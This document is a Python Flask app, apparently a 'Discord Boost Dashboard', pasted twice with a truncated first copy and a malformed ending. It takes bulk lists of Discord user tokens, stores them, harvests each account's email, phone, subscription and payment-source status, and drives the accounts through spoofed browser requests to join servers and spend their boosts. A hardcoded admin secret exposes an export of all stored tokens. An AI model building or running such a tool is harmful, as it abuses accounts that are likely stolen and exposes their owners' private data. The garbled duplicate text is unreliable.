from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import requests
import json
import os
import time
import hashlib
import random
import string
import threading
from datetime import datetime
from supabase import create_client, Client
import io

app = Flask(__name__)
CORS(app)

# ==================== SUPABASE SETUP ====================
# Replace these with your actual Supabase credentials
SUPABASE_URL = "https://YOUR_PROJECT_ID.supabase.co"
SUPABASE_KEY = "YOUR_ANON_KEY"

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# ==================== ADMIN SECRET ====================
ADMIN_SECRET = "admin123"

# ==================== TOKEN CHECKER ====================
def check_token(token):
    """Verify token validity and get Nitro info"""
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "Asia/Kolkata"
    }
    
    try:
        session = requests.Session()
        
        # Get user info
        r = session.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=15)
        
        if r.status_code == 200:
            user_data = r.json()
            
            # Get guilds
            r_guilds = session.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=15)
            guilds = r_guilds.json() if r_guilds.status_code == 200 else []
            
            # Get subscriptions (Nitro)
            r_subs = session.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, timeout=15)
            subscriptions = r_subs.json() if r_subs.status_code == 200 else []
            
            nitro = "No Nitro"
            nitro_days = 0
            for sub in subscriptions:
                sku = str(sub.get("sku_id", ""))
                plan = sub.get("subscription_plan", {})
                if "521846918637420545" in sku or "premium" in str(plan):
                    nitro = "Nitro Premium"
                    try:
                        end = sub["current_period_end"]
                        nitro_days = int((time.mktime(time.strptime(end, "%Y-%m-%dT%H:%M:%S.%f%z")) - time.time()) / 86400)
                        nitro = f"Nitro Premium ({nitro_days}d left)"
                    except:
                        pass
                elif "511651871736201216" in sku or "basic" in str(plan):
                    nitro = "Nitro Basic"
                    try:
                        end = sub["current_period_end"]
                        nitro_days = int((time.mktime(time.strptime(end, "%Y-%m-%dT%H:%M:%S.%f%z")) - time.time()) / 86400)
                        nitro = f"Nitro Basic ({nitro_days}d left)"
                    except:
                        pass
            
            # Get available boosts
            r_boosts = session.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers, timeout=15)
            boosts = 0
            if r_boosts.status_code == 200:
                boosts = sum(1 for s in r_boosts.json() if s.get("cooldown_ends_at") is None)
            
            # Get billing info (if available)
            r_billing = session.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=15)
            has_payment = r_billing.status_code == 200 and len(r_billing.json()) > 0
            
            return {
                "valid": True,
                "username": user_data.get("username", "Unknown"),
                "discriminator": user_data.get("discriminator", "0"),
                "email": user_data.get("email", ""),
                "phone": user_data.get("phone", ""),
                "verified": user_data.get("verified", False),
                "nitro": nitro,
                "nitro_days": nitro_days,
                "boosts": boosts,
                "guild_count": len(guilds),
                "user_id": user_data.get("id"),
                "avatar": user_data.get("avatar", ""),
                "has_payment": has_payment,
                "created_at": ((int(user_data.get("id", "0")) >> 22) + 1420070400000) / 1000
            }
        
        elif r.status_code == 401:
            return {"valid": False, "error": "Invalid/Revoked Token"}
        elif r.status_code == 403:
            return {"valid": False, "error": "Locked/Disabled Account"}
        elif r.status_code == 429:
            return {"valid": False, "error": "Rate Limited"}
        else:
            return {"valid": False, "error": f"HTTP {r.status_code}"}
            
    except requests.exceptions.Timeout:
        return {"valid": False, "error": "Timeout"}
    except Exception as e:
        return {"valid": False, "error": str(e)[:50]}

# ==================== USER TOKEN STORAGE (Supabase) ====================
def get_user_tokens(username):
    """Get all tokens for a user"""
    try:
        response = supabase.table('tokens').select('*').eq('username', username).execute()
        return response.data if response.data else []
    except Exception as e:
        print(f"Error getting tokens: {e}")
        return []

def add_user_token(username, token, token_info):
    """Add a token for a user"""
    try:
        supabase.table('tokens').insert({
            'username': username,
            'token': token,
            'added_at': datetime.now().isoformat(),
            'last_checked': datetime.now().isoformat(),
            'is_valid': True,
            'nitro_type': token_info.get('nitro', 'No Nitro'),
            'boosts_available': token_info.get('boosts', 0),
            'username_discord': token_info.get('username', 'Unknown'),
            'user_id': token_info.get('user_id', '')
        }).execute()
        return True
    except Exception as e:
        print(f"Error adding token: {e}")
        return False

def delete_user_token(username, token):
    """Delete a token for a user"""
    try:
        supabase.table('tokens').delete().eq('username', username).eq('token', token).execute()
        return True
    except Exception as e:
        print(f"Error deleting token: {e}")
        return False

# ==================== BOOST FUNCTIONS ====================
def join_server(token, invite_code):
    """Join a server using invite"""
    headers = {"Authorization": token, "Content-Type": "application/json"}
    url = f"https://discord.com/api/v9/invites/{invite_code}"
    try:
        r = requests.post(url, headers=headers, json={}, timeout=10)
        return r.status_code == 200
    except:
        return False

def apply_boost(token, guild_id):
    """Apply a boost to server"""
    headers = {"Authorization": token, "Content-Type": "application/json"}
    url = f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions"
    try:
        r = requests.post(url, headers=headers, json={}, timeout=10)
        return r.status_code in [200, 201]
    except:
        return False

def get_guild_id(invite_code):
    """Get guild ID from invite code"""
    try:
        r = requests.get(f"https://discord.com/api/v9/invites/{invite_code}", timeout=10)
        if r.status_code == 200:
            return r.json().get("guild", {}).get("id")
    except:
        pass
    return None

# ==================== MAIN ROUTES ====================
@app.route('/')
def dashboard():
    user = request.args.get('user', 'default')
    return render_template('dashboard.html', user=user)

@app.route('/admin')
def admin_panel():
    return render_template('admin.html')

@app.route('/api/tokens', methods=['GET'])
def get_tokens():
    username = request.args.get('user', 'default')
    tokens_data = get_user_tokens(username)
    
    results = []
    for token_data in tokens_data:
        token = token_data['token']
        info = check_token(token)
        results.append({
            "token": token[:20] + "..." if len(token) > 20 else token,
            "full_token": token,
            "id": token_data.get('id'),
            **info
        })
        
        # Update token status in database
        try:
            supabase.table('tokens').update({
                'last_checked': datetime.now().isoformat(),
                'is_valid': info['valid'],
                'nitro_type': info.get('nitro', 'No Nitro'),
                'boosts_available': info.get('boosts', 0),
                'username_discord': info.get('username', 'Unknown')
            }).eq('id', token_data['id']).execute()
        except:
            pass
    
    return jsonify(results)

@app.route('/api/tokens/add', methods=['POST'])
def add_token():
    data = request.json
    username = data.get('user', 'default')
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({"error": "No token provided"})
    
    # Check if token already exists
    existing = get_user_tokens(username)
    for t in existing:
        if t['token'] == token:
            return jsonify({"status": "exists", "message": "Token already exists"})
    
    # Verify token
    info = check_token(token)
    
    if info.get('valid'):
        # Add to database
        add_user_token(username, token, info)
        return jsonify({
            "status": "ok", 
            "username": info.get('username', 'Unknown'),
            "message": f"Token added for {info.get('username', 'Unknown')}"
        })
    else:
        return jsonify({
            "status": "invalid", 
            "error": info.get('error', 'Invalid token'),
            "message": "Token is invalid or expired"
        })

@app.route('/api/tokens/remove', methods=['POST'])
def remove_token():
    data = request.json
    username = data.get('user', 'default')
    token = data.get('token', '')
    
    delete_user_token(username, token)
    return jsonify({"status": "ok", "message": "Token removed"})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    username = request.form.get('user', 'default')
    file = request.files.get('file')
    
    if not file:
        return jsonify({"error": "No file"})
    
    content = file.read().decode('utf-8')
    
    # Parse tokens
    if content.strip().startswith('['):
        try:
            tokens_data = json.loads(content)
            tokens = tokens_data if isinstance(tokens_data, list) else []
        except:
            tokens = [line.strip() for line in content.split('\n') if line.strip()]
    else:
        tokens = [line.strip() for line in content.split('\n') if line.strip()]
    
    added = 0
    failed = 0
    results = []
    
    for token in tokens:
        if not token:
            continue
        
        # Check if exists
        existing = get_user_tokens(username)
        exists = False
        for t in existing:
            if t['token'] == token:
                exists = True
                break
        
        if exists:
            failed += 1
            results.append({"token": token[:20] + "...", "status": "exists"})
            continue
        
        # Verify and add
        info = check_token(token)
        if info.get('valid'):
            add_user_token(username, token, info)
            added += 1
            results.append({"token": token[:20] + "...", "status": "added", "username": info.get('username')})
        else:
            failed += 1
            results.append({"token": token[:20] + "...", "status": "invalid"})
    
    return jsonify({
        "status": "ok",
        "tokens_added": added,
        "tokens_failed": failed,
        "results": results[:10]
    })

@app.route('/api/boost/start', methods=['POST'])
def start_boost():
    data = request.json
    username = data.get('user', 'default')
    invite = data.get('invite', '').strip()
    target = int(data.get('target_boosts', 1))
    
    # Clean invite code
    if "discord.gg/" in invite:
        invite = invite.split("discord.gg/")[-1].split("/")[0]
    if "discord.com/invite/" in invite:
        invite = invite.split("discord.com/invite/")[-1].split("/")[0]
    
    # Get user's tokens
    tokens_data = get_user_tokens(username)
    
    if not tokens_data:
        return jsonify({"error": "No tokens found. Add tokens first!"})
    
    # Find valid tokens with boosts
    valid_tokens = []
    for token_data in tokens_data:
        info = check_token(token_data['token'])
        if info.get('valid') and info.get('boosts', 0) > 0:
            valid_tokens.append({
                'token': token_data['token'],
                'username': info.get('username', 'Unknown'),
                'boosts': info.get('boosts', 0)
            })
    
    if not valid_tokens:
        return jsonify({"error": "No valid tokens with boosts available"})
    
    total_boosts = sum(t['boosts'] for t in valid_tokens)
    if total_boosts < target:
        return jsonify({"error": f"Need {target} boosts but only have {total_boosts}"})
    
    # Start boost process in background
    def run_boosts():
        boosts_done = 0
        for vt in valid_tokens:
            if boosts_done >= target:
                break
            
            to_apply = min(vt['boosts'], target - boosts_done)
            guild_id = get_guild_id(invite)
            
            if not guild_id:
                continue
            
            if not join_server(vt['token'], invite):
                continue
            
            for i in range(to_apply):
                if apply_boost(vt['token'], guild_id):
                    boosts_done += 1
                time.sleep(2)
            time.sleep(3)
        
        # Save boost history
        try:
            supabase.table('boost_history').insert({
                'username': username,
                'invite_code': invite,
                'boosts_target': target,
                'boosts_applied': boosts_done,
                'boosted_at': datetime.now().isoformat()
            }).execute()
        except:
            pass
    
    thread = threading.Thread(target=run_boosts)
    thread.start()
    
    return jsonify({
        "status": "started",
        "message": f"Boost process started with {len(valid_tokens)} tokens",
        "total_boosts_available": total_boosts
    })

@app.route('/api/history', methods=['GET'])
def get_history():
    username = request.args.get('user', 'default')
    
    try:
        response = supabase.table('boost_history').select('*').eq('username', username).order('boosted_at', desc=True).execute()
        return jsonify(response.data if response.data else [])
    except:
        return jsonify([])

@app.route('/api/check_token', methods=['POST'])
def check_token_endpoint():
    data = request.json
    token = data.get('token', '')
    result = check_token(token)
    return jsonify(result)

@app.route('/health')
def health():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

# ==================== ADMIN ROUTES ====================
@app.route('/api/admin/verify', methods=['GET'])
def admin_verify():
    secret = request.args.get('secret', '')
    if secret == ADMIN_SECRET:
        return jsonify({"authorized": True})
    return jsonify({"authorized": False})

@app.route('/api/admin/all_data', methods=['GET'])
def admin_all_data():
    secret = request.args.get('secret', '')
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"})
    
    try:
        response = supabase.table('tokens').select('*').execute()
        all_tokens = response.data if response.data else []
        
        # Group by user
        users = {}
        for token in all_tokens:
            username = token['username']
            if username not in users:
                users[username] = {
                    'tokens': [],
                    'valid_count': 0,
                    'invalid_count': 0,
                    'nitro_count': 0,
                    'total_boosts': 0
                }
            users[username]['tokens'].append(token)
        
        # Check each token
        for username, user_data in users.items():
            for token_data in user_data['tokens']:
                info = check_token(token_data['token'])
                if info.get('valid'):
                    user_data['valid_count'] += 1
                    if info.get('nitro') and info['nitro'] != "No Nitro":
                        user_data['nitro_count'] += 1
                    user_data['total_boosts'] += info.get('boosts', 0)
                else:
                    user_data['invalid_count'] += 1
        
        users_list = [{'username': k, **v} for k, v in users.items()]
        
        return jsonify({
            'users': users_list,
            'total_tokens': len(all_tokens),
            'total_users': len(users)
        })
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/admin/user_tokens', methods=['GET'])
def admin_user_tokens():
    secret = request.args.get('secret', '')
    username = request.args.get('username', '')
    
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"})
    
    try:
        response = supabase.table('tokens').select('*').eq('username', username).execute()
        tokens = response.data if response.data else []
        
        results = []
        for token_data in tokens:
            info = check_token(token_data['token'])
            results.append({
                'id': token_data['id'],
                'token': token_data['token'],
                'token_preview': token_data['token'][:25] + '...',
                'added_at': token_data.get('added_at'),
                **info
            })
        
        return jsonify(results)
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/admin/delete_token', methods=['POST'])
def admin_delete_token():
    data = request.json
    secret = data.get('secret', '')
    token_id = data.get('token_id', '')
    
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"})
    
    try:
        supabase.table('tokens').delete().eq('id', token_id).execute()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/admin/delete_user_tokens', methods=['POST'])
def admin_delete_user_tokens():
    data = request.json
    secret = data.get('secret', '')
    username = data.get('username', '')
    
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"})
    
    try:
        supabase.table('tokens').delete().eq('username', username).execute()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/admin/export_all', methods=['GET'])
def admin_export_all():
    secret = request.args.get('secret', '')
    
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"})
    
    try:
        response = supabase.table('tokens').select('*').execute()
        return jsonify(response.data if response.data else [])
    except Exception as e:
        return jsonify({"error": str(e)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("\n" + "="*60)
    print("🚀 Discord Boost Dashboard")
    print("="*60)
    print
cd ~/discord_booster
cat > app.py << 'EOF'
from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import requests
import json
import os
import time
import hashlib
import random
import string
import threading
from datetime import datetime
from supabase import create_client, Client
import io

app = Flask(__name__)
CORS(app)

# ==================== SUPABASE SETUP ====================
# Replace these with your actual Supabase credentials
SUPABASE_URL = "https://YOUR_PROJECT_ID.supabase.co"
SUPABASE_KEY = "YOUR_ANON_KEY"

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# ==================== ADMIN SECRET ====================
ADMIN_SECRET = "admin123"

# ==================== TOKEN CHECKER ====================
def check_token(token):
    """Verify token validity and get Nitro info"""
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "Asia/Kolkata"
    }
    
    try:
        session = requests.Session()
        
        # Get user info
        r = session.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=15)
        
        if r.status_code == 200:
            user_data = r.json()
            
            # Get guilds
            r_guilds = session.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=15)
            guilds = r_guilds.json() if r_guilds.status_code == 200 else []
            
            # Get subscriptions (Nitro)
            r_subs = session.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, timeout=15)
            subscriptions = r_subs.json() if r_subs.status_code == 200 else []
            
            nitro = "No Nitro"
            nitro_days = 0
            for sub in subscriptions:
                sku = str(sub.get("sku_id", ""))
                plan = sub.get("subscription_plan", {})
                if "521846918637420545" in sku or "premium" in str(plan):
                    nitro = "Nitro Premium"
                    try:
                        end = sub["current_period_end"]
                        nitro_days = int((time.mktime(time.strptime(end, "%Y-%m-%dT%H:%M:%S.%f%z")) - time.time()) / 86400)
                        nitro = f"Nitro Premium ({nitro_days}d left)"
                    except:
                        pass
                elif "511651871736201216" in sku or "basic" in str(plan):
                    nitro = "Nitro Basic"
                    try:
                        end = sub["current_period_end"]
                        nitro_days = int((time.mktime(time.strptime(end, "%Y-%m-%dT%H:%M:%S.%f%z")) - time.time()) / 86400)
                        nitro = f"Nitro Basic ({nitro_days}d left)"
                    except:
                        pass
            
            # Get available boosts
            r_boosts = session.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers, timeout=15)
            boosts = 0
            if r_boosts.status_code == 200:
                boosts = sum(1 for s in r_boosts.json() if s.get("cooldown_ends_at") is None)
            
            # Get billing info (if available)
            r_billing = session.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=15)
            has_payment = r_billing.status_code == 200 and len(r_billing.json()) > 0
            
            return {
                "valid": True,
                "username": user_data.get("username", "Unknown"),
                "discriminator": user_data.get("discriminator", "0"),
                "email": user_data.get("email", ""),
                "phone": user_data.get("phone", ""),
                "verified": user_data.get("verified", False),
                "nitro": nitro,
                "nitro_days": nitro_days,
                "boosts": boosts,
                "guild_count": len(guilds),
                "user_id": user_data.get("id"),
                "avatar": user_data.get("avatar", ""),
                "has_payment": has_payment,
                "created_at": ((int(user_data.get("id", "0")) >> 22) + 1420070400000) / 1000
            }
        
        elif r.status_code == 401:
            return {"valid": False, "error": "Invalid/Revoked Token"}
        elif r.status_code == 403:
            return {"valid": False, "error": "Locked/Disabled Account"}
        elif r.status_code == 429:
            return {"valid": False, "error": "Rate Limited"}
        else:
            return {"valid": False, "error": f"HTTP {r.status_code}"}
            
    except requests.exceptions.Timeout:
        return {"valid": False, "error": "Timeout"}
    except Exception as e:
        return {"valid": False, "error": str(e)[:50]}

# ==================== USER TOKEN STORAGE (Supabase) ====================
def get_user_tokens(username):
    """Get all tokens for a user"""
    try:
        response = supabase.table('tokens').select('*').eq('username', username).execute()
        return response.data if response.data else []
    except Exception as e:
        print(f"Error getting tokens: {e}")
        return []

def add_user_token(username, token, token_info):
    """Add a token for a user"""
    try:
        supabase.table('tokens').insert({
            'username': username,
            'token': token,
            'added_at': datetime.now().isoformat(),
            'last_checked': datetime.now().isoformat(),
            'is_valid': True,
            'nitro_type': token_info.get('nitro', 'No Nitro'),
            'boosts_available': token_info.get('boosts', 0),
            'username_discord': token_info.get('username', 'Unknown'),
            'user_id': token_info.get('user_id', '')
        }).execute()
        return True
    except Exception as e:
        print(f"Error adding token: {e}")
        return False

def delete_user_token(username, token):
    """Delete a token for a user"""
    try:
        supabase.table('tokens').delete().eq('username', username).eq('token', token).execute()
        return True
    except Exception as e:
        print(f"Error deleting token: {e}")
        return False

# ==================== BOOST FUNCTIONS ====================
def join_server(token, invite_code):
    """Join a server using invite"""
    headers = {"Authorization": token, "Content-Type": "application/json"}
    url = f"https://discord.com/api/v9/invites/{invite_code}"
    try:
        r = requests.post(url, headers=headers, json={}, timeout=10)
        return r.status_code == 200
    except:
        return False

def apply_boost(token, guild_id):
    """Apply a boost to server"""
    headers = {"Authorization": token, "Content-Type": "application/json"}
    url = f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions"
    try:
        r = requests.post(url, headers=headers, json={}, timeout=10)
        return r.status_code in [200, 201]
    except:
        return False

def get_guild_id(invite_code):
    """Get guild ID from invite code"""
    try:
        r = requests.get(f"https://discord.com/api/v9/invites/{invite_code}", timeout=10)
        if r.status_code == 200:
            return r.json().get("guild", {}).get("id")
    except:
        pass
    return None

# ==================== MAIN ROUTES ====================
@app.route('/')
def dashboard():
    user = request.args.get('user', 'default')
    return render_template('dashboard.html', user=user)

@app.route('/admin')
def admin_panel():
    return render_template('admin.html')

@app.route('/api/tokens', methods=['GET'])
def get_tokens():
    username = request.args.get('user', 'default')
    tokens_data = get_user_tokens(username)
    
    results = []
    for token_data in tokens_data:
        token = token_data['token']
        info = check_token(token)
        results.append({
            "token": token[:20] + "..." if len(token) > 20 else token,
            "full_token": token,
            "id": token_data.get('id'),
            **info
        })
        
        # Update token status in database
        try:
            supabase.table('tokens').update({
                'last_checked': datetime.now().isoformat(),
                'is_valid': info['valid'],
                'nitro_type': info.get('nitro', 'No Nitro'),
                'boosts_available': info.get('boosts', 0),
                'username_discord': info.get('username', 'Unknown')
            }).eq('id', token_data['id']).execute()
        except:
            pass
    
    return jsonify(results)

@app.route('/api/tokens/add', methods=['POST'])
def add_token():
    data = request.json
    username = data.get('user', 'default')
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({"error": "No token provided"})
    
    # Check if token already exists
    existing = get_user_tokens(username)
    for t in existing:
        if t['token'] == token:
            return jsonify({"status": "exists", "message": "Token already exists"})
    
    # Verify token
    info = check_token(token)
    
    if info.get('valid'):
        # Add to database
        add_user_token(username, token, info)
        return jsonify({
            "status": "ok", 
            "username": info.get('username', 'Unknown'),
            "message": f"Token added for {info.get('username', 'Unknown')}"
        })
    else:
        return jsonify({
            "status": "invalid", 
            "error": info.get('error', 'Invalid token'),
            "message": "Token is invalid or expired"
        })

@app.route('/api/tokens/remove', methods=['POST'])
def remove_token():
    data = request.json
    username = data.get('user', 'default')
    token = data.get('token', '')
    
    delete_user_token(username, token)
    return jsonify({"status": "ok", "message": "Token removed"})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    username = request.form.get('user', 'default')
    file = request.files.get('file')
    
    if not file:
        return jsonify({"error": "No file"})
    
    content = file.read().decode('utf-8')
    
    # Parse tokens
    if content.strip().startswith('['):
        try:
            tokens_data = json.loads(content)
            tokens = tokens_data if isinstance(tokens_data, list) else []
        except:
            tokens = [line.strip() for line in content.split('\n') if line.strip()]
    else:
        tokens = [line.strip() for line in content.split('\n') if line.strip()]
    
    added = 0
    failed = 0
    results = []
    
    for token in tokens:
        if not token:
            continue
        
        # Check if exists
        existing = get_user_tokens(username)
        exists = False
        for t in existing:
            if t['token'] == token:
                exists = True
                break
        
        if exists:
            failed += 1
            results.append({"token": token[:20] + "...", "status": "exists"})
            continue
        
        # Verify and add
        info = check_token(token)
        if info.get('valid'):
            add_user_token(username, token, info)
            added += 1
            results.append({"token": token[:20] + "...", "status": "added", "username": info.get('username')})
        else:
            failed += 1
            results.append({"token": token[:20] + "...", "status": "invalid"})
    
    return jsonify({
        "status": "ok",
        "tokens_added": added,
        "tokens_failed": failed,
        "results": results[:10]
    })

@app.route('/api/boost/start', methods=['POST'])
def start_boost():
    data = request.json
    username = data.get('user', 'default')
    invite = data.get('invite', '').strip()
    target = int(data.get('target_boosts', 1))
    
    # Clean invite code
    if "discord.gg/" in invite:
        invite = invite.split("discord.gg/")[-1].split("/")[0]
    if "discord.com/invite/" in invite:
        invite = invite.split("discord.com/invite/")[-1].split("/")[0]
    
    # Get user's tokens
    tokens_data = get_user_tokens(username)
    
    if not tokens_data:
        return jsonify({"error": "No tokens found. Add tokens first!"})
    
    # Find valid tokens with boosts
    valid_tokens = []
    for token_data in tokens_data:
        info = check_token(token_data['token'])
        if info.get('valid') and info.get('boosts', 0) > 0:
            valid_tokens.append({
                'token': token_data['token'],
                'username': info.get('username', 'Unknown'),
                'boosts': info.get('boosts', 0)
            })
    
    if not valid_tokens:
        return jsonify({"error": "No valid tokens with boosts available"})
    
    total_boosts = sum(t['boosts'] for t in valid_tokens)
    if total_boosts < target:
        return jsonify({"error": f"Need {target} boosts but only have {total_boosts}"})
    
    # Start boost process in background
    def run_boosts():
        boosts_done = 0
        for vt in valid_tokens:
            if boosts_done >= target:
                break
            
            to_apply = min(vt['boosts'], target - boosts_done)
            guild_id = get_guild_id(invite)
            
            if not guild_id:
                continue
            
            if not join_server(vt['token'], invite):
                continue
            
            for i in range(to_apply):
                if apply_boost(vt['token'], guild_id):
                    boosts_done += 1
                time.sleep(2)
            time.sleep(3)
        
        # Save boost history
        try:
            supabase.table('boost_history').insert({
                'username': username,
                'invite_code': invite,
                'boosts_target': target,
                'boosts_applied': boosts_done,
                'boosted_at': datetime.now().isoformat()
            }).execute()
        except:
            pass
    
    thread = threading.Thread(target=run_boosts)
    thread.start()
    
    return jsonify({
        "status": "started",
        "message": f"Boost process started with {len(valid_tokens)} tokens",
        "total_boosts_available": total_boosts
    })

@app.route('/api/history', methods=['GET'])
def get_history():
    username = request.args.get('user', 'default')
    
    try:
        response = supabase.table('boost_history').select('*').eq('username', username).order('boosted_at', desc=True).execute()
        return jsonify(response.data if response.data else [])
    except:
        return jsonify([])

@app.route('/api/check_token', methods=['POST'])
def check_token_endpoint():
    data = request.json
    token = data.get('token', '')
    result = check_token(token)
    return jsonify(result)

@app.route('/health')
def health():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

# ==================== ADMIN ROUTES ====================
@app.route('/api/admin/verify', methods=['GET'])
def admin_verify():
    secret = request.args.get('secret', '')
    if secret == ADMIN_SECRET:
        return jsonify({"authorized": True})
    return jsonify({"authorized": False})

@app.route('/api/admin/all_data', methods=['GET'])
def admin_all_data():
    secret = request.args.get('secret', '')
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"})
    
    try:
        response = supabase.table('tokens').select('*').execute()
        all_tokens = response.data if response.data else []
        
        # Group by user
        users = {}
        for token in all_tokens:
            username = token['username']
            if username not in users:
                users[username] = {
                    'tokens': [],
                    'valid_count': 0,
                    'invalid_count': 0,
                    'nitro_count': 0,
                    'total_boosts': 0
                }
            users[username]['tokens'].append(token)
        
        # Check each token
        for username, user_data in users.items():
            for token_data in user_data['tokens']:
                info = check_token(token_data['token'])
                if info.get('valid'):
                    user_data['valid_count'] += 1
                    if info.get('nitro') and info['nitro'] != "No Nitro":
                        user_data['nitro_count'] += 1
                    user_data['total_boosts'] += info.get('boosts', 0)
                else:
                    user_data['invalid_count'] += 1
        
        users_list = [{'username': k, **v} for k, v in users.items()]
        
        return jsonify({
            'users': users_list,
            'total_tokens': len(all_tokens),
            'total_users': len(users)
        })
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/admin/user_tokens', methods=['GET'])
def admin_user_tokens():
    secret = request.args.get('secret', '')
    username = request.args.get('username', '')
    
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"})
    
    try:
        response = supabase.table('tokens').select('*').eq('username', username).execute()
        tokens = response.data if response.data else []
        
        results = []
        for token_data in tokens:
            info = check_token(token_data['token'])
            results.append({
                'id': token_data['id'],
                'token': token_data['token'],
                'token_preview': token_data['token'][:25] + '...',
                'added_at': token_data.get('added_at'),
                **info
            })
        
        return jsonify(results)
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/admin/delete_token', methods=['POST'])
def admin_delete_token():
    data = request.json
    secret = data.get('secret', '')
    token_id = data.get('token_id', '')
    
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"})
    
    try:
        supabase.table('tokens').delete().eq('id', token_id).execute()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/admin/delete_user_tokens', methods=['POST'])
def admin_delete_user_tokens():
    data = request.json
    secret = data.get('secret', '')
    username = data.get('username', '')
    
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"})
    
    try:
        supabase.table('tokens').delete().eq('username', username).execute()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/admin/export_all', methods=['GET'])
def admin_export_all():
    secret = request.args.get('secret', '')
    
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"})
    
    try:
        response = supabase.table('tokens').select('*').execute()
        return jsonify(response.data if response.data else [])
    except Exception as e:
        return jsonify({"error": str(e)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("\n" + "="*60)
    print("🚀 Discord Boost Dashboard")
    print("="*60)
 print(f"\n📍 User Dashboard: http://localhost:{port}/?user=YOURNAME")
    print(f"📍 Admin Panel: http://localhost:{port}/admin")
    print(f"🔑 Admin Secret: {ADMIN_SECRET}")
    print("\n⚠️  Press Ctrl+C to stop")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=port, debug=False)
